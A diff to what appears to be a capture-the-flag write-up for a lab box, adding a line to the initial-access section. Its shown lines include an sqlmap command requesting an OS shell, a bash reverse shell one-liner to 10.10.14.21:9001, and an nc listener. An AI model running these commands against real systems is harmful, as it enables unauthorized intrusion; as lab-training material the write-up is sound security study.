@@ -66,6 +66,7 @@ sqlmap -r ./request.txt --dbs --os-shell --force-ssl --timeout 1000000000
 </br>
 
 It worked! to get a reverse shell, I then used this command to get a stable shell: ```bash -c 'bash -i &> /dev/tcp/10.10.14.21/9001 0>&1'``` </br>
+and on another shell I listened to port 9001 with the command: ```nc -nlvp 9001``` </br>
 ![initial_shell](images/toolbox/initial_shell.png) </br>
 
 # Privilege Escalation
